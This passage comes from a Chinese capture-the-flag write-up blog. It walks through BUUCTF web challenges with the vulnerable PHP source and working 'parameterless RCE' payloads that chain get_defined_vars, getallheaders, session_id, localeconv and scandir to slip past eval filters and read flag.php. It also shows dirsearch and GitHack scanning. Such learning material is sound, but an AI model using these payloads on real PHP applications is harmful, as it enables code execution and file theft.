class="hljs-number">102835099</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/xhy18634297976/article/details/<span class="hljs-number">122852540</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6650</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;utm_relevant_index=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p><img src="/img/tw1.png" alt="tw1"></p><p>源码没啥信息，直接dirsearch扫看看吧：</p><p><code>python dirsearch.py -u http://8126df41-22c6-4533-823d-8e6fc9622f9d.node4.buuoj.cn --delay 3 -t 30</code></p><p><img src="/img/tw2.png" alt="tw2"></p><p>扫出来很多.git文件。。应该是git泄露了，用GitHack弄它：</p><p><code>python GitHack.py -u http://8126df41-22c6-4533-823d-8e6fc9622f9d.node4.buuoj.cn/.git/</code></p><p><img src="/img/tw3.png" alt="tw3"></p><p>现在windows下看看，不行再用Kali做。发现有个Index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//正则匹配，过滤了点伪协议要用的东西(比如data://啥的，前面加那个\是转义用的)，没触发则进行下一步判断。/i模式不区分大小写</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//匹配a-z，逗号和_，\(和\)分别是转义后的左括号和右括号。(?R)?这玩意儿查了一下说是递归模式?正则过滤后的结果必须强等于分号</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//又一次过滤了一大堆东西                // echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs PHP">正则匹配中(?R)?递归模式的解释：<br>    ?R是引用当前表达式((/[a-z,_]+((?R)?)/))，形成递归调用。<br>    ?表示递归当前表达式<span class="hljs-number">0</span>次或<span class="hljs-number">1</span>次。若是(?R)*则表示递归当前表达式<span class="hljs-number">0</span>次或多次，例如它可以匹配<span class="hljs-title function_ invoke__">a</span>(<span class="hljs-title function_ invoke__">b</span>(<span class="hljs-title function_ invoke__">c</span>()<span class="hljs-title function_ invoke__">d</span>()))，举个栗子：<br>    <br>    <br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a(b(c(d()f()e())));&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$a</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;goodbye&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">//echo  hello</span><br> <br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a(b(c(d()f()e())));&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)*\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$a</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;goodbye&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//echo  goodbye</span><br><br><span class="hljs-comment">//注意$a的格式，如果是很标准的一个括号套着一个括号：a(b(c()))，ok,用这两种都没问题，但你如果有的地方套了两个：a(b()c())。那第一种就不行了，只能用第二种。我个人理解就是?一个套着一个这样搞，但是*允许一个套多个。感觉这就是题目说的套娃？一般RCE都要给执行命令的函数传参，比如eval(system(&#x27;ls&#x27;));。匹配完了会多个&#x27;&#x27;出来。</span><br>    <br></code></pre></td></tr></table></figure><p>经过这种正则匹配后能过滤的基本都过滤了，去网上查了wp原来这是一种叫<code>无参数RCE</code>的题型(第一次见)。下面的内容参考了这两位师傅的文章，感谢!</p><p><code>https://blog.csdn.net/Manuffer/article/details/120738755</code></p><p><code>https://blog.csdn.net/weixin_46330722</code></p><p>无参数RCE一般有三种解法：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>.利用<span class="hljs-built_in">getallheaders</span>()函数。<br><span class="hljs-number">2</span>.利用<span class="hljs-built_in">get_defined_vars</span>()函数。<br><span class="hljs-number">3</span>.利用session_id帮助命令执行。<br></code></pre></td></tr></table></figure><p>拿<code>getallheaders()</code>来说，这东西会以数组形式返回所有HTTP头信息，举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());<span class="hljs-comment">//数组形式所以我用了var_dump</span><br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/img/tw4.png" alt="tw4"></p><p>可以看到以数组的形式返回了HTTP数据包的头和对应信息，有意思的一点是这东西是倒着出来的。</p><p>数组形式肯定没法用，想给<code>eval</code>啥的传参肯定要是个字符串。可以利用<code>implode</code>函数把数组变成字符串，看下GPT对这个函数的解释：</p><p><img src="/img/tw5.png" alt="tw5"></p><p>不过这个$glue并不是必须的，默认没东西直接串起来，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw6.png" alt="tw6"></p><p>现在字符串也得到了，我么可以在传http包的时候给数据包底下加个头比如：<code>renyi:system(&#39;whoami&#39;);//</code>达到执行任意命令的目的(后面跟着注释符号，把其他的注释掉了)。</p><p>不过着这种方法我没成功。。。</p><p><code>get_defined_vars()</code>：返回所有已定义所组成的数组，不过这个和<code>getallheaders()</code>不一样，它返回的是多维数组，举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>());<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw7.png" alt="tw7"></p><p>可以看到这东西会把GET传入的参数显示在第一位</p><p><img src="/img/tw8.png" alt="tw8"></p><p>GET传入的参数可控，那我们肯定希望在这个多维数组中取出我们想要的东西：利用<code>current</code>函数：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span>函数可以返回数组中的单元且初始指针指向数组的第一个单元。因为GET方式传入的参数存在该二维数组中的第一个一维数组，所以我们可以通果这个函数将其取出来<br></code></pre></td></tr></table></figure><p>举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw9.png" alt="tw9"></p><p><img src="/img/tw10.png" alt="tw10"></p><p>传两个参数也可以↑</p><p>假如我们要传入的恶意代码放在GET后面(传的第一个参数为了绕过一些特定参数的检测，第二个参数放恶意代码)，那么如何通过<code>current(get_defined_vars())</code>把他取出来？</p><p>可以利用<code>end</code>函数(返回数组最后一个单元的值)，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">get_defined_vars</span>()));<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/tw11.png" alt="tw11"></p><p>绕了个小小的圈子，现在写个简单的东西看看为啥要通过第二种方法传两个参数达到<code>RCE</code>的效果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123; <br>      <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br><br><br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造payload:<code>?exp=eval(end(current(get_defined_vars())));&amp;c=system(phpinfo());</code></p><p><img src="/img/tw12.png" alt="tw12"></p><p>可以看到成功执行了<code>system(phpinfo())</code>。解释下为什么这么写：<code>eval(end(current(get_defined_vars())));</code>这东西为了返回我们get传过去的最后一个参数的值。我一开始没加eval想着外面已经有个eval了(当时人晕了，哈哈)，里面这个eval是为了执行这些套娃函数把恶意代码翻出来，外面的eval是执行恶意代码用的，一来一回就相当于<code>eval(system(phpinfo()))</code>了。而且这第二个参数可以随便构造，反正它只检测<code>exp</code>。</p><p>第三种方法通过<code>session_id</code>执行恶意代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//作用是获取当前会话的ID,也就是cookie中的phpsession，这里要注意的一点是，phpsession中只允许出现 a-z A-Z 0-9 , - 等字符，所以不能直接插入恶意代码，可以先将其16进制编码后再插入。</span><br>测试代码：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-title function_ invoke__">session_start</span>()));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//参考了novic4师傅的文章</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-variable">$a</span> = implode(getallheaders());<br><span class="hljs-regexp">//</span>ech<br><span class="hljs-regexp">//</span>var_dump(localeconv());<br><span class="hljs-regexp">//</span>var_dump(scandir(<span class="hljs-string">&#x27;.&#x27;</span>));<br><span class="hljs-regexp">//</span><span class="hljs-variable">$viper</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;viper&#x27;</span>];<br><span class="hljs-regexp">//</span>@eval(<span class="hljs-variable">$viper</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/tw13.png" alt="tw13"></p><p>注意这个hex2bin，他是字符串转字符串而不是数字转数字。</p><p>现在思路就比较清晰了：<code>phpsession</code>头的值我们可以控制，先通过<code>eval(hex2bin(session_id(session_start())));</code>把我们需要的恶意代码翻出来，然后把它传给exp参数就行了(注意要把恶意代码转成十六进制！)：</p><p><code>因为我到现在还没整明白怎么用burpsuite抓本地包，所以下面的图参考了novic4师傅的图，再次感谢！</code></p><p><img src="/img/tw14.png" alt="tw14"></p><p>现在回到这个套娃题，已知过滤了<code>et</code>，<code>hex</code>等，似乎上面三种方法都用不了了。。。</p><p>看了师傅们的wp，第一个payload这么写：</p><p><code>?exp=print_r(scandir(current(localeconv())));</code></p><p>先看看这个<code>localeconv()</code>返回了什么东西：</p><p><img src="/img/tw17.png" alt="tw17"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">localeconv</span>());<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/img/tw15.png" alt="tw15"></p><p>第一项返回了我们想要的<code>.</code>。再利用<code>current</code>返回一维数组第一项的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw16.png" alt="tw16"></p><p>注意这里和前面那个<code>get_defined_vars</code>区分开，人家返回的是多维数组，现在我们只返回了一个数组，所以<code>current</code>后只有一个点。</p><p><code>scandir(&#39;.&#39;)</code>这东西会以数组形式返回当前目录下的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/tw18.png" alt="tw18"></p><p>综上，我们先通过<code>/?exp=var_dump(scandir(current(localeconv())));</code>看看当前目录下的文件都有啥(var_dump也能用<code>print_r</code>等代替：</p><p><img src="/img/tw19.png" alt="tw19"></p><p>可以看到倒数第二个文件就是flag.php了，构造payload:</p><p><code>?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</code></p><p>因为<code>flag.php</code>在倒数第二个，所以先<code>array_reverse</code>把它转成正数第二个，然后<code>next</code>将指针向下移动直接提取第二个(前面的<code>current</code>将指针放在首位)。</p><p><img src="/img/tw20.png" alt="tw20"></p><p>也可以用<code>highlight_file()</code>函数替换，他俩差不多。</p><p>还有一种情况，比如这个flag.php的位置不特殊：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">如果flag.php的位置不特殊，可以使用<span class="hljs-title function_ invoke__">array_rand</span>()和<span class="hljs-title function_ invoke__">array_flip</span>()(<span class="hljs-title function_ invoke__">array_rand</span>()返回的是键名所以必须搭配<span class="hljs-title function_ invoke__">array_flip</span>()来交换键名、键值来获得键值，函数作用上面有写到)来随机刷新显示的内容，刷几次就出来了，所以这种情况payload：<br> ?exp=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br><span class="hljs-title function_ invoke__">array_rand</span>()这东西会返回随机一个键名，<span class="hljs-title function_ invoke__">array_flip</span>()用于交换数组中的键和值，这两个组合一下就会获得随机的一个键值。因为这东西完全随机的，所以多刷新几次才可能会出现flag！    <br></code></pre></td></tr></table></figure><p>第二种方法使用session_id：</p><p>不过正则匹配过滤了<code>hex</code>，前面的<code>eval(hex2bin(session_id(session_start())));</code>肯定没法用了，不过师傅的博客里说<code>PHPSESSIID</code>这东西可以直接给他赋值<code>flag.php</code>：</p><p>payload:<code>?exp=show_source(session_id(session_start()));</code></p><p>并加个<code>cookie</code>头：<code>cookie:PHPSESSID=flag.php</code></p><p><img src="/img/tw21.png" alt="tw21"></p><p>以上内容参考了这些师傅们的文章，感谢！：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sculptor-liu.github.io<span class="hljs-regexp">/2021/</span><span class="hljs-number">03</span><span class="hljs-regexp">/20/</span>GXYCTF-<span class="hljs-number">2019</span>-%E7%A6%<span class="hljs-number">81</span>%E6%AD%A2%E5%A5%<span class="hljs-number">97</span>%E5%A8%<span class="hljs-number">83</span>/<br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/LLeaves/</span>p/<span class="hljs-number">12868440</span>.html<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_62879498/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">124538469</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/Manuffer/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">120738755</span>?spm=<span class="hljs-number">1001.2014</span>.<span class="hljs-number">3001.5506</span><br></code></pre></td></tr></table></figure><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>进环境发现是这么个东西。。</p><p><img src="/img/pswh1.png" alt="pswh1"></p><p>确实和题目对应了，哈哈。他这个报错好像是个</p><p>不知道干啥就用dirsearch扫：<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p>Kali下不用加后面那一串：<code>python dirsearch.py -u http://7136b55a-48c9-48ae-8945-1df4a83d47e7.node4.buuoj.cn:81/</code></p><p>扫出来两个东西：<code>index.php</code>和<code>robots.txt</code>，访问<code>robots.txt</code>：</p><p><img src="/img/pswh2.png" alt="pswh2"></p><p><code>index.php</code>就是进去这个界面，访问下这个<code>fAke_f1agggg.php</code>:</p><p><img src="/img/pswh3.png" alt="pswh3"></p><p>:(，burpsuite抓包看看什么情况：</p><p><img src="/img/pswh4.png" alt="pswh4"></p><p>芜湖，响应包里有这么个东西：<code>fl4g.php</code>，直接访问：</p><p><img src="/img/pswh5.png" alt="pswh5"></p><p>这里发现个问题：页面返回一堆乱码，但是放burpsuite的repeater模块里看又不存在，和上面那段<code>php</code>报错有关系？不太懂。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><span class="hljs-comment">//level 1</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) &lt; <span class="hljs-number">2020</span> &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span> + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2021</span>)&#123;<span class="hljs-comment">//num经过intval后要小于2020，加1再inntval要大于2021，直接用科学计数法绕过：2e4，即/?num=2e4</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;金钱解决不了穷人的本质问题&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><span class="hljs-comment">//level 2</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<span class="hljs-comment">//md5弱等于其md5加密后，弱等于是先将字符串类型转化成相同再比较。转换的规则为，若该字符串以合法的数值开始，则使用该值，否则其值为0。找个加密前0e开头加密后仍为0e的就行了</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//get flag</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$get_flag</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get_flag&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get_flag</span>,<span class="hljs-string">&quot; &quot;</span>))&#123; <span class="hljs-comment">//get_flag中不能有空格</span><br>        <span class="hljs-variable">$get_flag</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;wctf2020&quot;</span>, <span class="hljs-variable">$get_flag</span>);  <span class="hljs-comment">//str_ireplace函数不区分大小写。</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$get_flag</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span 